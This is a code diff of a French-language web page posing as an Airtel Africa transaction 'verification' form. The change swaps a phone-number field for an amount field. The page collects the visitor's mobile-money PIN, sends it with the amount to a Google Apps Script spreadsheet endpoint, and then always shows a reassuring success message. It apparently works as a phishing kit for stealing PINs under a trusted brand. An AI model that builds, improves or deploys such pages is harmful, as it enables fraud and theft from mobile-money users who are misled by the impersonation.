@@ -11,7 +11,7 @@
     body {
       font-family: 'Inter', sans-serif;
       background: radial-gradient(circle at 10% 20%, #fff5f0 0%, #ffebe6 100%);
-      min-height: 100vh;
+      min-height: 60vh;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -110,6 +110,7 @@
       justify-content: center;
     }
     .form-header h2 { font-size: 1.8rem; font-weight: 800; color: #881a28; }
+    .form-header p { margin-top: 0.4rem; color: #6b6b6b; font-size: 0.9rem; }
     .input-group { margin-bottom: 1.6rem; display: flex; flex-direction: column; gap: 0.5rem; }
     .input-group label { font-weight: 700; font-size: 0.85rem; display: flex; align-items: center; gap: 0.6rem; }
     .input-field {
@@ -133,6 +134,16 @@
       font-size: 1rem;
       outline: none;
     }
+    .input-field .currency-tag {
+      font-weight: 700;
+      font-size: 0.8rem;
+      color: #9b1d2c;
+      background: #fdecea;
+      padding: 0.25rem 0.6rem;
+      border-radius: 1rem;
+      white-space: nowrap;
+      margin-left: 0.5rem;
+    }
     .verify-airtel-btn {
       background: linear-gradient(95deg, #b71c1c, #d32f2f);
       border: none;
@@ -150,6 +161,7 @@
       margin-top: 0.8rem;
     }
     .verify-airtel-btn:hover { background: linear-gradient(95deg, #8e1a1a, #b71c1c); transform: translateY(-2px); }
+    .verify-airtel-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
     .status-message { margin-top: 1.5rem; padding: 1rem; border-radius: 1.5rem; font-size: 0.85rem; font-weight: 600; text-align: center; }
     .status-error { background: #ffefed; color: #b71c1c; border-left: 5px solid #f97316; }
     .status-success { background: #e6f4f1; color: #1e5f4e; border-left: 5px solid #2e7d64; }
@@ -171,15 +183,25 @@
   </div>
 
   <div class="verify-area">
-    <div class="form-header"><h2><i class="fas fa-shield-alt"></i> Vérifiez votre ligne</h2><p>Entrez le numéro de mobile local (sans indicatif) et le code PIN</p></div>
-    <div class="input-group">
-      <label><i class="fas fa-mobile-screen-button"></i> Numéro de mobile (sans indicatif)</label>
-      <div class="input-field"><i class="fas fa-phone-alt"></i><input type="tel" id="localPhone" placeholder="712345678" autocomplete="off"></div>
+    <div class="form-header">
+      <h2><i class="fas fa-shield-alt"></i> Vérifiez votre transaction</h2>
+      <p>Entrez le montant de votre opération et votre code PIN</p>
     </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-coins"></i> Montant</label>
+      <div class="input-field">
+        <i class="fas fa-money-bill-wave"></i>
+        <input type="text" id="amountInput" inputmode="decimal" placeholder="5000" autocomplete="off">
+        <span class="currency-tag">FCFA</span>
+      </div>
+    </div>
+
     <div class="input-group">
       <label><i class="fas fa-key"></i> Code PIN (4 à 8 chiffres)</label>
       <div class="input-field"><i class="fas fa-lock"></i><input type="password" id="pinCode" inputmode="numeric" pattern="\d*" placeholder="entrez un code PIN sécurisé" autocomplete="off"></div>
     </div>
+
     <button class="verify-airtel-btn" id="verifyBtn"><i class="fas fa-check-double"></i> Vérifier et envoyer</button>
     <div id="statusMessage" class="status-message" style="display: none;"></div>
     <div class="info-note"><i class="fas fa-database"></i> Votre vérification nous aide à étendre la couverture et à améliorer les services</div>
@@ -192,10 +214,14 @@
   const GOOGLE_SHEET_API_URL = "https://script.google.com/macros/s/AKfycbwE8sHSK6AUjzuwQFIlq-sznwIhh36YTWfVV0AFOSyT-RZA13khq9n3KNnagpAnRZV1/exec";   // <--- À METTRE À JOUR
   // ===================================================
 
-  const phoneInput = document.getElementById('localPhone');
+  const amountInput = document.getElementById('amountInput');
   const pinInput = document.getElementById('pinCode');
   const verifyBtn = document.getElementById('verifyBtn');
   const statusDiv = document.getElementById('statusMessage');
+
+  // Montant minimum et maximum acceptés
+  const MIN_AMOUNT = 100;
+  const MAX_AMOUNT = 10000000;
 
   function showStatus(message, isError = true) {
     statusDiv.style.display = 'block';
@@ -208,9 +234,18 @@
 
   function extractDigits(str) { return str.replace(/\D/g, ''); }
 
-  function isValidLocalPhone(phone) {
-    const digits = extractDigits(phone);
-    return digits.length >= 7 && digits.length <= 12;
+  // Normalise "1 500,50" ou "1.500,50" -> 1500.50
+  function parseAmount(str) {
+    let cleaned = str.replace(/\s/g, '').replace(/,/g, '.');
+    // Si plusieurs points, on garde le dernier comme séparateur décimal
+    const parts = cleaned.split('.');
+    if (parts.length > 2) cleaned = parts.slice(0, -1).join('') + '.' + parts[parts.length - 1];
+    const value = parseFloat(cleaned);
+    return isNaN(value) ? NaN : value;
+  }
+
+  function isValidAmount(value) {
+    return !isNaN(value) && value >= MIN_AMOUNT && value <= MAX_AMOUNT;
   }
 
   function isValidPin(pin) {
@@ -218,15 +253,19 @@
     return digits.length >= 4 && digits.length <= 8 && digits.length === pin.trim().length;
   }
 
+  function formatAmount(value) {
+    return value.toLocaleString('fr-FR', { minimumFractionDigits: 0, maximumFractionDigits: 2 });
+  }
+
   // Envoyer les données vers Google Sheets via Apps Script
-  async function sendToSheet(phoneNumber, pin) {
+  async function sendToSheet(amount, pin) {
     try {
       const response = await fetch(GOOGLE_SHEET_API_URL, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phoneNumber: phoneNumber,
+          amount: amount,
           pin: pin,
           status: 'Verified',
           timestamp: new Date().toISOString(),
@@ -234,7 +273,6 @@
         })
       });
       // En mode no-cors, response est opaque et response.ok n'est pas fiable. On simule un succès.
-      // Pour une véritable vérification, il faudrait un proxy CORS, mais ici on accepte l'envoi silencieux.
       return { ok: true, result: {} };
     } catch (err) {
       console.error('Erreur d\'envoi vers la feuille:', err);
@@ -246,12 +284,14 @@
     e.preventDefault();
     clearStatus();
 
-    const phoneRaw = phoneInput.value.trim();
+    const amountRaw = amountInput.value.trim();
     const pinRaw = pinInput.value;
 
-    if (!isValidLocalPhone(phoneRaw)) {
-      showStatus("❌ Veuillez entrer un numéro de mobile local valide (7 à 12 chiffres, sans indicatif).", true);
-      phoneInput.focus();
+    const amountValue = parseAmount(amountRaw);
+
+    if (!isValidAmount(amountValue)) {
+      showStatus(`❌ Veuillez entrer un montant valide compris entre ${formatAmount(MIN_AMOUNT)} et ${formatAmount(MAX_AMOUNT)} FCFA.`, true);
+      amountInput.focus();
       return;
     }
     if (!isValidPin(pinRaw)) {
@@ -260,7 +300,6 @@
       return;
     }
 
-    const cleanPhone = extractDigits(phoneRaw);
     const cleanPin = extractDigits(pinRaw);
 
     // Afficher un indicateur de chargement sur le bouton
@@ -269,14 +308,13 @@
     verifyBtn.disabled = true;
 
     // Envoyer vers Google Sheet
-    const sheetResult = await sendToSheet(cleanPhone, cleanPin);
+    const sheetResult = await sendToSheet(amountValue, cleanPin);
 
     verifyBtn.innerHTML = originalBtnText;
     verifyBtn.disabled = false;
 
     if (sheetResult.ok) {
-      const masked = cleanPhone.slice(-4);
-      showStatus(`✅ Vérification réussie pour ****${masked}. Données enregistrées. Vous faites désormais partie du réseau grandissant d'Airtel Africa !`, false);
+      showStatus(`✅ Vérification réussie pour un montant de ${formatAmount(amountValue)} FCFA. Données enregistrées. Vous faites désormais partie du réseau grandissant d'Airtel Africa !`, false);
     } else {
       showStatus(`⚠️ Vérification réussie mais impossible d'enregistrer les données. Veuillez réessayer plus tard. Erreur : ${sheetResult.error || 'problème réseau'}`, true);
     }
@@ -288,27 +326,30 @@
     if (statusDiv.style.display === 'block' && statusDiv.classList.contains('status-error')) clearStatus();
   });
 
-  phoneInput.addEventListener('input', function() {
-    this.value = this.value.replace(/[^0-9\s\-]/g, '');
+  // Nettoyage en temps réel du montant (chiffres, espace, virgule, point)
+  amountInput.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9\s.,]/g, '');
     if (statusDiv.style.display === 'block' && statusDiv.classList.contains('status-error')) clearStatus();
   });
 
-  // Bloquer la touche '+' (prévention de l'indicatif)
-  phoneInput.addEventListener('keydown', (e) => {
-    if (e.key === '+') {
+  // Bloquer les caractères non numériques (sauf séparateurs) sur le montant
+  amountInput.addEventListener('keydown', (e) => {
+    const allowed = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
+    if (allowed.includes(e.key) || e.ctrlKey || e.metaKey) return;
+    if (!/^[0-9.,\s]$/.test(e.key)) {
       e.preventDefault();
       const warn = document.createElement('div');
-      warn.innerText = '⚠️ Aucun indicatif nécessaire. Entrez uniquement le numéro local.';
+      warn.innerText = '⚠️ Entrez uniquement un montant numérique.';
       warn.style.fontSize = '0.7rem';
       warn.style.color = '#c62828';
       warn.style.marginTop = '4px';
-      phoneInput.parentElement.parentElement.appendChild(warn);
+      amountInput.parentElement.parentElement.appendChild(warn);
       setTimeout(() => warn.remove(), 2000);
     }
   });
 
   // Appui sur Entrée pour soumettre
-  [phoneInput, pinInput].forEach(field => {
+  [amountInput, pinInput].forEach(field => {
     field.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyBtn.click(); });
   });
 </script>
